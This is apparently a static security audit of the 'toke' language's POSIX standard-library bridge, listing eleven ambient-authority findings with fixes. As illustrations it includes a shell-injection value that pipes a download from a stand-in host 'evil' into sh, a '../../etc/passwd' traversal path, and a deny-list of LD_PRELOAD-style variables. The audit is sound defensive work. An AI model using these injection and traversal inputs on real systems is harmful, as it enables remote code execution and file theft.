## 120.11 — Ambient authority surface

**Scope / method.** Static, read-only review of the toke stdlib POSIX bridge and
its exposure glue: `src/stdlib/os.c` (raw syscall bridge), `file.c`, `path.c`,
`env.c`, `process.c` (fork+execvp) and its wrapper `process_glue.c`, and
`server_ops.c` (fork+execv). The goal is to catalogue every OS capability a
compiled toke program acquires with **no gate**, and to flag concrete defects in
path handling, symlink/TOCTOU safety, PATH/exec trust, and environment
injection. No build was run; findings cite lines read directly. This document is
the primary input to ADR-0010 (capability model).

toke is AOT-compiled to native code with **no language-level sandbox**: any
program that imports these modules runs with the full ambient OS authority of
the invoking user. The findings below are therefore ranked by *incremental*
exploitability (misuse primitives, injection sinks, symlink escapes) on top of
the baseline "no gate exists at all" design issue (AMB-01).

---

### AMB-01 — No capability gate: full ambient OS authority is granted unconditionally
- **Severity:** High (design) · **Reachability:** local / build-time
- **Where:** `src/stdlib/os.c` (whole file), `file.c`, `env.c`, `process.c`
- **Description.** There is no capability, permission, or policy layer between a
  compiled toke program and the OS. Importing `std.os` exposes raw
  `open`/`read`/`write`/`lseek`/`stat`/`unlink`/`rename`/`mkdir`/`rmdir`/
  `access`/`getcwd`/`getenv`/`setenv`/`_exit` (os.c:23–98). `std.file` adds
  arbitrary read/write/append/delete, recursive directory removal, copy/move,
  glob, and recursive listing (file.c). `std.env` adds read/write/delete/list of
  the entire environment plus dotenv loading (env.c). `std.process` adds
  fork+exec of arbitrary programs (process.c). None of these consult any
  allowlist, root-jail, or grant token — the only enforcement is the kernel's
  own DAC for the running uid.
- **Impact.** Any dependency (transitively) or any ooke request handler that
  reaches a std API can read `~/.ssh`, exfiltrate secrets, delete files, or spawn
  processes. There is no way to run untrusted or semi-trusted toke code, and no
  way for a web app author to drop privileges for a request. This is the
  headline design gap the capability model must close.
- **Fix.** Introduce an explicit capability model (ADR-0010): compile-time
  capability declarations gated per-module (e.g. `fs.read`, `fs.write`,
  `process.spawn`, `env.write`, `net`), enforced by a runtime broker that each
  stdlib entry point consults. Default-deny for anything not declared; support a
  filesystem root/allowlist for `fs.*` and a command allowlist for
  `process.spawn`.

---

### AMB-02 — `process.exec` / `spawndetached` / `readlines` run untrusted strings through `/bin/sh -c`
- **Severity:** High · **Reachability:** remote-auth · **Confidence:** confirmed
- **Where:** `src/stdlib/process_glue.c:18` (`spawn_shell`), used by
  `tk_process_exec_w` (:127), `tk_process_spawndetached_w` (:158),
  `tk_process_readlines_w` (:149)
- **Description.** `spawn_shell` builds `argv = { "sh", "-c", cmdstr, NULL }` and
  execs it (process_glue.c:18–23). The `process.exec(cmd)`, `spawndetached(cmd)`,
  and `readlines(cmd)` convenience APIs take a **single command string** and pass
  it verbatim to the shell. Any toke/ooke code that interpolates request data,
  filenames, or env values into that string yields classic shell command
  injection (`; rm -rf`, `$(...)`, backticks, pipes).
- **Impact.** In an ooke handler, `process.exec("convert " + user_filename)` with
  `user_filename = "x; curl evil|sh"` executes attacker commands with the
  server's authority — remote code execution behind whatever auth the endpoint
  has.
- **Fix.** Do not offer a shell-string exec primitive, or route it through the
  capability broker with a hard warning. Prefer the argv-vector `process.spawn`
  form (which avoids the shell) and document the string form as unsafe; if it
  must exist, require an explicit `unsafe_shell` capability.

---

### AMB-03 — `process.spawn` resolves argv[0] via `execvp` (PATH-trusting), and PATH is program-writable
- **Severity:** High · **Reachability:** local / remote-auth · **Confidence:** confirmed
- **Where:** `src/stdlib/process.c:131` (`execvp(cmd[0], ...)`);
  PATH is settable via `env.c:82` (`env_set`→setenv) and `env.c:347`
  (`env_file_load`→setenv)
- **Description.** `process_spawn` uses `execvp`, which searches `$PATH` when
  `cmd[0]` contains no slash (process.c:131). A toke program can rewrite `PATH`
  through `env.set` / `env_file_load` (no key is reserved), so a spawn of a
  bare name like `"git"` or `"sh"` resolves against an attacker-influenced PATH.
  A writable directory placed early in PATH (or `.` if present) lets a planted
  binary hijack the exec.
- **Impact.** Command hijacking / privilege reuse: subprocesses that the author
  believes are trusted system tools are replaced by attacker binaries. Combined
  with AMB-04 (dotenv-set PATH) this is a reliable code-execution chain.
- **Fix.** Under the capability model, require absolute paths for `process.spawn`
  (or an explicit command allowlist), and snapshot/validate PATH rather than
  trusting the ambient value. Consider `execv`/`posix_spawn` with an explicit
  resolved path instead of `execvp`.

---

### AMB-04 — `env_file_load` sets arbitrary environment variables with no key allowlist
- **Severity:** High · **Reachability:** local · **Confidence:** confirmed
- **Where:** `src/stdlib/env.c:286`–`347` (`setenv(key, processed, 1)` at :347)
- **Description.** `env_file_load` parses any `KEY=VALUE` dotenv file and calls
  `setenv` for every pair (env.c:347). `key_is_valid` only rejects empty keys and
  keys containing `=` (env.c:28–35) — it does **not** exclude security-sensitive
  names. An attacker who can influence the loaded `.env` (a checked-in file, an
  uploaded config, a shared working dir) can set `LD_PRELOAD`,
  `DYLD_INSERT_LIBRARIES`, `LD_LIBRARY_PATH`, `PATH`, or `IFS`.
- **Impact.** `LD_PRELOAD` / `DYLD_INSERT_LIBRARIES` set here are inherited by
  every subsequent `process.spawn` / `proc_binary_upgrade` child (and, on many
  platforms, take effect within the current process's own later dynamic loads),
  giving arbitrary native code execution. Setting `PATH` chains directly into
  AMB-03.
- **Fix.** Deny-list (or, better, allow-list) dangerous keys in `env_file_load`,
  and gate `env.write` behind the capability model. At minimum refuse
  `LD_*`, `DYLD_*`, `PATH`, and `IFS` from untrusted dotenv sources.

---

### AMB-05 — `file_rmdir_r` follows symlinks (`stat`, not `lstat`) — recursive delete escapes the tree
- **Severity:** Medium · **Reachability:** local / remote-auth · **Confidence:** confirmed
- **Where:** `src/stdlib/file.c:249` (`stat(child, &st)` then recurse / `opendir`)
- **Description.** The recursive remover classifies each entry with `stat`
  (file.c:249), which **follows symlinks**. If an entry is a symlink to a
  directory, `S_ISDIR` is true, so `file_rmdir_r(child)` opens the *target*
  directory (opendir follows the link) and unlinks the files inside it
  (file.c:250–253). The trailing `rmdir(symlink)` then fails, but the target's
  contents are already gone. Note the codebase already knows the correct pattern
  elsewhere: `file_listall` uses `nftw(..., FTW_PHYS)` to avoid following links
  (file.c:648) — `file_rmdir_r` is inconsistent.
- **Impact.** An attacker who can plant a symlink anywhere inside a tree that the
  application later `rmdir_r`s (e.g. a temp/upload/build directory) causes
  deletion of arbitrary files outside the tree, up to the running uid's rights.
  Also a TOCTOU window exists between the `stat` and the `opendir`/`unlink`.
- **Fix.** Use `lstat` to detect symlinks and `unlink` them instead of recursing;
  or reimplement on `nftw(FTW_PHYS)` / `openat(O_NOFOLLOW)` + `unlinkat` fd-walk.

---

### AMB-06 — `path_join` / `file_join` do not normalize `..`, so they are unsafe as containment primitives
- **Severity:** Medium · **Reachability:** remote-auth · **Confidence:** confirmed
- **Where:** `src/stdlib/path.c:21` (`path_join`), `src/stdlib/file.c:358` (`file_join`)
- **Description.** Both joiners only collapse redundant slashes at the seam; they
  perform no `..` normalization (path.c:21–42, file.c:358–379). `path_join("/srv/www", "../../etc/passwd")`
  returns `"/srv/www/../../etc/passwd"`, which the OS resolves to `/etc/passwd`.
  Web frameworks routinely build served paths as `join(webroot, request_path)`,
  and toke provides no safe alternative (the only canonicalizer, `file_absolute`
  → `realpath`, is not wired into the joiners).
- **Impact.** Directory traversal: a request path containing `../` escapes the
  intended root when the result is passed to `file_read`/`open`. This is the
  textbook static-file-serving path-traversal sink and there is no built-in
  guard.
- **Fix.** Provide a normalizing/containment join (resolve `.`/`..` lexically and
  verify the result is a prefix of the root, or `realpath` + prefix-check), and
  document `path_join` as non-security-preserving. The existing
  `docs/security/path-traversal-audit.md` should reference this primitive gap.

---

### AMB-07 — File open/read/write/copy follow symlinks (no `O_NOFOLLOW`); write-through-symlink + TOCTOU
- **Severity:** Low · **Reachability:** local / remote-auth · **Confidence:** confirmed
- **Where:** `src/stdlib/file.c:47` (`fopen rb`), `:76` (`fopen w`), `:90`
  (`fopen a`), `:279`/`:283` (copy), and `os.c:23` (`open` with caller flags)
- **Description.** Every file entry point opens by path with default,
  symlink-following semantics; none use `O_NOFOLLOW`/`openat`. Writing to a path
  an attacker has replaced with a symlink writes to the link target. Combined
  with the ambient-authority baseline and the non-normalizing joiners (AMB-06),
  an attacker who controls a filename or a directory in the path can redirect
  reads/writes and race the check-then-open window.
- **Impact.** Arbitrary file overwrite / disclosure through planted symlinks in
  attacker-writable directories; classic TOCTOU between `file_exists`/`stat`
  checks and the subsequent open.
- **Fix.** Offer `O_NOFOLLOW` / `openat`-relative variants for security-sensitive
  writes and make them the default under the `fs.*` capability; document that the
  plain APIs follow symlinks.

---

### AMB-08 — Raw `read`/`write` take a caller-supplied integer as the buffer address
- **Severity:** Low · **Reachability:** local · **Confidence:** likely
- **Where:** `src/stdlib/os.c:31` (`tk_os_read`), `:35` (`tk_os_write`)
- **Description.** `buf` arrives as `int64_t` and is cast straight to a pointer:
  `(void *)(intptr_t)buf` (os.c:32,36), with `count` unchecked. A toke program
  that passes an arbitrary integer gets an arbitrary-process-memory read/write
  primitive with no bounds validation.
- **Impact.** Within the process's own address space this is "only" a
  memory-safety footgun (the program already has ambient authority), but it
  defeats any higher-level bounds/typing the compiler emits and turns a logic bug
  into an OOB read/write. It should not be a directly callable surface without a
  safe wrapper that binds `buf`/`count` to a real toke bytes object.
- **Fix.** Do not expose the raw pointer form; expose only length-checked
  bytes/string-backed variants where the runtime owns the buffer.

---

### AMB-09 — `process_set_cwd` is a no-op — spawned children never `chdir`, contradicting the API's promise
- **Severity:** Low · **Reachability:** local · **Confidence:** confirmed
- **Where:** `src/stdlib/process.c:482`–`500` (`process_set_cwd`); `process_spawn`
  (:42–209) never reads `h->cwd`
- **Description.** The handle is allocated *inside* `process_spawn` (process.c:186),
  so `process_set_cwd` — which only stores into an existing handle and bails once
  `pid != 0` (process.c:493) — can never influence the child. The child's exec
  path (process.c:111–143) contains no `chdir`, so a requested working directory
  is silently ignored.
- **Impact.** Callers who believe they have confined a subprocess to a specific
  directory (a weak sandboxing expectation) are wrong; the child inherits the
  parent's cwd. Not itself an escape, but a false sense of containment that
  matters once relative paths / `.`-in-PATH are involved.
- **Fix.** Either implement cwd (accept it in the spawn call and `chdir` in the
  child before exec) or remove the API and document that cwd is inherited.

---

### AMB-10 — Server binary-upgrade trusts `TK_LISTEN_FD` from the environment and clears CLOEXEC
- **Severity:** Low · **Reachability:** local · **Confidence:** likely
- **Where:** `src/stdlib/server_ops.c:169`–`177` (`proc_inherit_listen_fd`,
  `atoi`), `:134`–`163` (`proc_binary_upgrade`, `execv` + CLOEXEC clear at :142–144)
- **Description.** `proc_inherit_listen_fd` reads `TK_LISTEN_FD`, `atoi`s it, and
  (only checking `> 0`) treats it as the server's listening socket
  (server_ops.c:169–177). An attacker who controls the process environment (see
  AMB-04) can point the server at an fd of their choosing. `proc_binary_upgrade`
  additionally strips `FD_CLOEXEC` from the listen fd before fork/exec so it
  survives into the new image (server_ops.c:142–144). `execv` (not `execvp`) is
  used, so PATH is not searched here — good — but `binary_path` is trusted.
- **Impact.** Environment-driven fd confusion for the listener; combined with
  env-injection it can misdirect where the upgraded process accepts connections.
  Requires prior control of the process environment, hence Low.
- **Fix.** Validate the inherited fd (e.g. `fstat` it is a listening socket) and
  gate binary upgrade behind the capability model; treat `binary_path` as
  security-sensitive.

---

### AMB-11 — Non-reentrant `getcwd`/`strerror` bridges (static buffers, no error signal)
- **Severity:** Info · **Reachability:** local · **Confidence:** confirmed
- **Where:** `src/stdlib/os.c:71`–`75` (`tk_os_getcwd`, `static char buf[4096]`),
  `:106`–`108` (`tk_os_strerror`, plain `strerror`)
- **Description.** `tk_os_getcwd` returns a pointer into a shared `static` buffer
  and returns `""` on failure rather than an error (os.c:71–75); `tk_os_strerror`
  uses the non-reentrant `strerror` (os.c:106). Concurrent calls (threads / signal
  contexts) race and can observe torn or overwritten data.
- **Impact.** Data races / stale-path reads in multithreaded servers; masked error
  conditions. No direct exploit, hygiene only.
- **Fix.** Use `getcwd` into a caller/heap buffer and `strerror_r`; return an
  explicit error result on failure.

---

## Dynamic-testing follow-up

The following warrant runtime proof beyond this static pass (not run here to
avoid racing parallel audits' shared build tree):

1. **AMB-05 symlink escape** — build a temp tree with an internal symlink to an
   external directory, run `file.rmdir_r`, and confirm external contents are
   deleted (ASAN/strace to observe the `opendir` following the link).
2. **AMB-02 shell injection** — end-to-end PoC through an ooke handler calling
   `process.exec` with crafted input; confirm command execution.
3. **AMB-03 / AMB-04 chain** — set `PATH`/`LD_PRELOAD` via `env_file_load`, then
   `process.spawn` a bare name; confirm hijack / preload injection in the child.
4. **AMB-08 raw pointer** — fuzz `os.read`/`os.write` with out-of-range `buf`
   integers under ASAN to characterise the OOB primitive.
5. **AMB-06 traversal** — fuzz `path_join`/`file_join` with `..` sequences and a
   downstream `file_read` to demonstrate escape past an intended root.

## Positive observations

- `process_spawn` uses the race-free FD_CLOEXEC "error pipe" idiom to detect exec
  failure, and the argv-vector form of `process.spawn` avoids the shell entirely
  (process.c:83–183). Preferring this form is the right default.
- `file_rmdir_r` deliberately avoids `system("rm -rf")` and walks the tree in C
  (file.c:220–221) — the remaining issue is only the symlink-follow (AMB-05).
- `file_listall` correctly uses `nftw(..., FTW_PHYS)` to avoid following symlinks
  (file.c:648).
- `file_absolute` uses `realpath(3)` for canonicalization (file.c:459) — the
  correct primitive; it simply needs to be wired into a safe containment join.
- `env` key validation rejects empty keys and embedded `=` before `setenv`
  (env.c:28–35), avoiding the classic `setenv` UB, and `env_file_load` bounds its
  line/value buffers (env.c:294,321).
- `server_ops` binary upgrade uses `execv` (no PATH search) and the config-test
  path validates port range and worker caps (server_ops.c:203–255).
